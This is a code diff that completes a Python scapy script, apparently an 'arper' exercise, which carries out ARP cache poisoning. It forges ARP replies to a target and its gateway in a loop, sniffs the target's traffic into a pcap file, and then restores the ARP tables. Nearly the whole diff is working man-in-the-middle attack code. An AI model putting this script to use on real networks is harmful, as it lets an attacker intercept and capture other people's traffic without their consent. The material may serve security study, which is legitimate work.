@@ -9,6 +9,8 @@ import signal
 import sys
 import argparse
 
+poisoning = False
+
 def getargs():
     '''parse the command line arguments'''
     # process the command line
@@ -40,13 +42,40 @@ def getmac(name, ip_addr, confirm=True):
 
 def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
     '''poison'''
-    pass
+    global poisoning
+    poison_t = ARP()
+    poison_t.op = 2
+    poison_t.psrc = gateway_ip
+    poison_t.pdst = target_ip
+    poison_t.hwdst = target_mac
+
+    poison_g = ARP()
+    poison_g.op = 2
+    poison_g.psrc = target_ip
+    poison_g.pdst = gateway_ip
+    poison_g.hwdst = gateway_mac
+    print '[*] Begining the ARP poison. [CTRL-C to stop]'
+    while poisoning:
+        send(poison_t)
+        send(poison_g)
+        time.sleep(2)
+    print '[*] ARP poison attack finished.'
+    return
+
 def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
     '''restore the arp setup'''
-    pass
+    # slightly different method using send
+    print '[*] Restoring target...'
+    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
+                hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)
+    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
+                hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)
+    print '[*] Target restored.'
+    
 
 def main():
     '''main'''
+    global poisoning
     ns = getargs()
     gateway_ip = ns.gateway
     target_ip = ns.target
@@ -64,21 +93,30 @@ def main():
     gateway_mac = getmac('Gateway', gateway_ip, True)
     target_mac = getmac('Target', target_ip, True)
 
+
     poison_thread = threading.Thread(target=poison_target,
                                      args=(gateway_ip,
                                            gateway_mac,
                                            target_ip,
                                            target_mac))
+    poisoning = True
     poison_thread.start()
 
     try:
         print '[*] Starting sniffer for %d packets' % count
         bpf_filter = 'ip host %s' % target_ip
         packets = sniff(count=count, filter=bpf_filter, iface=interface)
-        wrpcap('arper.pcap', packets)
-
-        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
     except KeyboardInterrupt:
+        pass
+    finally:
+        print'[*] Writing the packets...'
+        wrpcap('arper.pcap', packets)
+        print'[*] Packets written.'
+
+        poisoning = False
+
+        time.sleep(2)
+
         restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
         sys.exit(0)
 
